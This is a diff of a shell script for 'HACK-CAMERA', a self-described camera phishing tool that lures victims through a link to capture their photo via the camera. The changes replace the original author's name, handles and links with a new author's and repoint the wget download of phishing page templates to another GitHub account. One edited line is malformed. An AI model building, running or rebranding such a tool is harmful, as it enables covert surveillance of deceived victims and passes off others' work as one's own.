@@ -3,10 +3,10 @@
 # HACK-CAMERA 
 # Version    : 2.1
 # Description: CameraHackHack is a camera Phishing tool. Send a phishing link to victim, if he/she gives access to camera, his/her photo will be captured!
-# Author     : X PHANTOM PH4N70M
+# Author     : UNKNOWN TEKNOVA 
 # Github     : https://github.com/hackerxphantom
 # Join Us    : https://bit.ly/3PV3S3r
-# Date       : 29-05-2022
+# Date       : 22-10-2027
 # Language   : Shell, HTML, Css
 # Portable File
 # If you copy, consider giving credit! We keep our code open source to help others
@@ -41,7 +41,7 @@ ${blue} | | | |  / \  / ___| |/ /     / ___|  / \  |  \/  | ____|  _ \    / \
 ${blue} | |_| | / _ \| |   | ' /_____| |     / _ \ | |\/| |  _| | |_) |  / _ \  
 ${blue} |  _  |/ ___ \ |___| . \_____| |___ / ___ \| |  | | |___|  _ <  / ___ \ 
 ${blue} |_| |_/_/   \_\____|_|\_\     \____/_/   \_\_|  |_|_____|_| \_\/_/   \_\
-${green}                                               [By X PHANTOM (PH4N7OM)]
+${green}                                               [By UNKNOWN(TEKNOVA)]
 "
 
 # Package Installer
@@ -368,7 +368,7 @@ ${red}[${white}0${red}] ${cyan}Exit${blue}
 "
 
 sleep 1
-printf "${cyan}\nXPHANTOM${nc}@${blue}PH4N70M ${red}$ ${nc}"
+printf "${cyan}\nXTEKNOVA${nc}@${blue}TEKNOVA ${red}$ ${nc}"
 read option
 # Select template
     if echo $option | grep -q "1"; then
@@ -376,7 +376,7 @@ read option
         break
     elif echo $option | grep -q "2"; then
         dir="fest"
-        printf "\n${ask}Enter festival name:${cyan}\n\nXPHANTOM${nc}@${blue}XPH4N70M ${red}$ ${nc}"
+        printf "\n${ask}Enter festival name:${cyan}\n\nTEKNOVA${nc}@${blue}TEKNOVA ${red}$ ${nc}"
         read fest_name
         if [ -z $fest_name ]; then
             echo -e "\n${error}Invalid input!\n\007"
@@ -387,7 +387,7 @@ read option
         fi
     elif echo $option | grep -q "3"; then
         dir="live"
-        printf "\n${ask}Enter youtube video ID:${cyan}\n\nXPhantom${nc}@${blue}XPH4N70M ${red}$ ${nc}"
+        printf "\n${ask}Enter youtube video ID:${cyan}\n\nTEKNOVA${nc}@${blue}TEKNOVA ${red}$ ${nc}"
         read vid_id
         if [ -z $vid_id ]; then
             echo -e "\n${error}Invalid input!\n\007"
@@ -405,7 +405,7 @@ read option
             export TN="Cloudflared"
         fi
     elif echo $option | grep -q "i"; then
-        printf "\n${ask}Enter Directory:${cyan}\n\nXPHANTOM${nc}@${blue}XPH4N70M ${red}$ ${nc}"
+        printf "\n${ask}Enter Directory:${cyan}\n\nTEKNOVA${nc}@${blue}TEKNOVA ${red}$ ${nc}"
         read dire
         if ! [ -d $dire ]; then
             echo -e "\n${error}Invalid directory!\n\007"
@@ -421,11 +421,10 @@ read option
         echo -e "$red[ToolName]  ${cyan}  :[HACK-CAMERA]
 $red[Version]    ${cyan} :[2.1]
 $red[Description]${cyan} :[Camera Phishing tool]
-$red[Author]     ${cyan} :[XPHANTOM PH4N70M]
-$red[Github]     ${cyan} :[https://github.com/hackerxphantom] 
-$red[Join us]    ${cyan} :[https://bit.ly/3PV3S3r]
-$red[Telegarm]   ${cyan} :[https://t.me/x_PH4N7OM]"
-printf "${cyan}\nXPHANTOM${nc}@${cyan}XPH4N70M ${red}$ ${nc}"
+$red[Author]     ${cyan} :[UNKNOWN TEKNOVA ]
+$red[Github]     ${cyan} :hhttps://github.com/teknovamd-starCAMERA-HACKING ${cyan} :[https://bit.ly/3PV3S3r]
+$red[Telegarm]   ${cyan} :[https://t.me/x_TEKNOVA]"
+printf "${cyan}\nTEKNOVA${nc}@${cyan}TEKNOVA ${red}$ ${nc}"
 read about
     elif echo $option | grep -q "m"; then
         xdg-open "https://bit.ly/3PV3S3r"
@@ -445,7 +444,7 @@ if ! [ -d $dir ];then
 mkdir $dir
 cd $dir
 netcheck
-wget -q --show-progress "https://github.com/XPH4N70M/files/raw/main/${dir}.zip"
+wget -q --show-progress "https://github.com/teknovamd-star/files/raw/main/${dir}.zip"
 unzip ${dir}.zip > /dev/null 2>&1
 rm -rf ${dir}.zip
 else
